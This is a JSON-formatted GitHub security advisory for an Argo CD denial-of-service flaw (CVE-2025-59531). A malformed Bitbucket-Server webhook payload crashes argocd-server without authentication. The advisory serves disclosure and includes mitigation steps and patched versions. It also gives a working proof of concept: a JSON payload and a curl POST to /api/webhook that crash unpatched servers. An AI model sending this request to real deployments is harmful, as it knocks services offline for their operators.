{
  "Severity": "HIGH",
  "UpdatedAt": "2025-09-30T18:12:01Z",
  "Package": {
    "Ecosystem": "GO",
    "Name": "github.com/argoproj/argo-cd/v3"
  },
  "Advisory": {
    "DatabaseId": 314518,
    "Id": "GSA_kwCzR0hTQS1mOWdxLXBycmMtaHJoY84ABMyW",
    "GhsaId": "GHSA-f9gq-prrc-hrhc",
    "References": [
      {
        "Url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-f9gq-prrc-hrhc"
      },
      {
        "Url": "https://github.com/argoproj/argo-cd/commit/5c466a4e39802e059e75c0008ae7b7b8e842538f"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59531"
      },
      {
        "Url": "https://pkg.go.dev/vuln/GO-2025-3993"
      },
      {
        "Url": "https://github.com/advisories/GHSA-f9gq-prrc-hrhc"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-f9gq-prrc-hrhc"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-59531"
      }
    ],
    "Description": "### Summary\n\nUnpatched Argo CD versions are vulnerable to malicious API requests which can crash the API server and cause denial of service to legitimate clients. \n\nWith the default configuration, no `webhook.bitbucketserver.secret` set, Argo CDâ€™s /api/webhook endpoint will crash the entire argocd-server process when it receives a Bitbucket-Server push event whose JSON field `repository.links.clone` is anything other than an array.\n\nA single unauthenticated curl request can push the control-plane into CrashLoopBackOff; repeating the request on each replica causes a complete outage of the API.\n\n### Details\n```go\n// webhook.go (Bitbucket-Server branch in affectedRevisionInfo)\n\nfor _, l := range payload.Repository.Links[\"clone\"].([]any) {   // \u003c- unsafe cast\n    link := l.(map[string]any)\n    ...\n}\n```\n\nIf links.clone is a string, number, object, or null, the first type assertion panics:\ninterface conversion: interface {} is string, not []interface {}\n\nThe worker goroutine created by startWorkerPool lacks a recover, so the panic terminates the whole binary.\n\n### PoC\n\nSave as payload-panic.json - note the non-array links.clone.\n\n```json\n{\n  \"eventKey\": \"repo:refs_changed\",\n  \"repository\": {\n    \"name\": \"guestbook\",\n    \"fullName\": \"APP/guestbook\",\n    \"links\": { \"clone\": \"boom\" }\n  },\n  \"changes\": [ { \"ref\": { \"id\": \"refs/heads/master\" } } ]\n}\n```\n\n```shell\ncurl -k -X POST https://argocd.example.com/api/webhook \\\n     -H 'X-Event-Key: repo:refs_changed' \\\n     -H 'Content-Type: application/json' \\\n     --data-binary @payload-panic.json\n```\n\nObserved crash (argocd-server restart):\n\n```\npanic: interface conversion: interface {} is string, not []interface {}\ngoroutine 192 [running]:\ngithub.com/argoproj/argo-cd/v3/server/webhook.affectedRevisionInfo\n    webhook.go:209 +0x1218\n...\n```\n\n### Mitigation\n\nIf you use Bitbucket Server and need to handle webhook events, configure a webhook secret to ensure only trusted parties can invoke the webhook handler.\n\nIf you do not use Bitbucket Server, you can set the webhook secret to a long, random value to effectively disable webhook handling for Bitbucket Server payloads.\n\n```diff\napiVersion: v1\nkind: Secret\nmetadata:\n  name: argocd-secret\ntype: Opaque\ndata:\n+  webhook.bitbucketserver.secret: \u003cyour base64-encoded secret here\u003e\n```\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n### Credits\n\nDiscovered by Jakub Ciolek at AlphaSense.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-09-30T18:11:59Z",
    "Severity": "HIGH",
    "Summary": "Unauthenticated argocd-server panic via a malicious Bitbucket-Server webhook payload",
    "UpdatedAt": "2025-10-23T20:22:01Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.5,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "3.0.19"
      },
      "VulnerableVersionRange": "\u003e= 3.0.0-rc1, \u003c= 3.0.18"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "3.1.8"
      },
      "VulnerableVersionRange": "\u003e= 3.1.0-rc1, \u003c= 3.1.7"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "3.2.0-rc2"
      },
      "VulnerableVersionRange": "= 3.2.0-rc1"
    }
  ]
}